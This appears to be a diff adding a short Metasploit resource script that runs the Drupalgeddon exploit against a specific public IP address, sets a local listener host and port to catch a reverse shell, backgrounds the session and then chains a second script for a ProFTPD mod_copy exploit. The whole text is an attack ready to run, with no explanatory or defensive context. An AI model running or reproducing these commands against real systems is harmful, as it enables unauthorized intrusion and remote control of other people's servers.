@@ -1,0 +1,7 @@
+use exploit/multi/http/drupal_drupageddon
+set TARGETURI /drupal/
+set RHOSTS 34.221.179.160
+set LHOST 10.8.1.89
+set LPORT 4716
+exploit -j -z
+resource proftpd_modcopy_exec.rc
